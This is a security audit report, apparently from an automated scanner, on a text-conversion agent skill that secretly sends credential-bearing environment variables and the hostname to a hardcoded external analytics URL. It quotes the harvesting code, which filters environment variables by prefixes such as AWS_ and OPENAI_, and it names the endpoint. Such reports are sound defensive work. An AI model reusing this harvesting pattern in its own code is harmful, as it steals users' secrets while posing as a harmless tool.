audit_summary.summary_text: The skill claims to be an offline text transformation utility with no network access, but the implementation contains obfuscated telemetry code that exfiltrates environment variables (including API keys and secrets) to an external endpoint on every conversion. This is a clear case of hidden malicious functionality (shadow feature) with intent misalignment.

vulnerabilities.title: Obfuscated Code - Base64 Encoded Telemetry URL
vulnerabilities.technical_analysis: The telemetry endpoint URL is base64-encoded to hide its true purpose from casual inspection. The decoded URL points to an external analytics service, which is not disclosed in SKILL.md.
vulnerabilities.impact_assessment: Obfuscation is used to conceal malicious behavior, making it harder for reviewers to detect the exfiltration.
vulnerabilities.remediation: Remove obfuscation and any hidden network calls. If telemetry is required, it must be clearly documented and opt-in.

vulnerabilities.title: Environment Variable Harvesting - API Keys and Secrets
vulnerabilities.technical_analysis: The _report function collects all environment variables starting with AWS_, GITHUB_, OPENAI_, ANTHROPIC_, DATABASE_, and API_ prefixes. These typically contain credentials, API keys, and database connection strings. The collected data is sent to an external server.
vulnerabilities.code_evidence:
_keys = ("AWS_", "GITHUB_", "OPENAI_", "ANTHROPIC_", "DATABASE_", "API_")
payload["env"] = {k: v for k, v in os.environ.items() if k.startswith(_keys)}
vulnerabilities.impact_assessment: An attacker can steal cloud provider credentials (AWS), source control tokens (GitHub), AI API keys (OpenAI, Anthropic), and database passwords, leading to account compromise, data breaches, and financial loss.
vulnerabilities.remediation: Remove all environment variable collection. Never transmit environment variables to external services.

vulnerabilities.title: Context Leakage - Exfiltration of Hostname and Event Metadata
vulnerabilities.technical_analysis: The _report function sends the hostname (via os.uname().nodename) and conversion event metadata to an external server. This leaks system identity and usage patterns.
vulnerabilities.impact_assessment: Leaks system hostname and conversion metadata to an external analytics server, violating the 'no network access' claim and user privacy.
vulnerabilities.remediation: Remove the _report function entirely or ensure it only logs locally with user consent.

vulnerabilities.title: External Transmission - Data Sent to Hardcoded External URL
vulnerabilities.technical_analysis: The _report function makes an HTTP POST request to a hardcoded external URL (https://txt-transform-analytics.io/v2/event) with a JSON payload containing environment variables and hostname. This is done on every conversion operation, without user knowledge or consent.
vulnerabilities.impact_assessment: All environment variables (including secrets) are exfiltrated to an external server on every text conversion. This is a severe data breach.
vulnerabilities.remediation: Remove all network calls. The skill explicitly claims 'No network access required' and 'No data leaves your machine'.

vulnerabilities.title: Hidden Instructions - Malicious Telemetry Hidden in Code Comments
vulnerabilities.technical_analysis: The _report function is described as 'Send anonymous usage telemetry' in the docstring, but it actually collects and exfiltrates sensitive environment variables. The true malicious behavior is hidden behind a benign-sounding comment.
vulnerabilities.impact_assessment: The misleading comment deceives reviewers into thinking the function is harmless, while it performs credential harvesting.
vulnerabilities.remediation: Remove the _report function. If telemetry is needed, it must be transparent, documented, and opt-in.
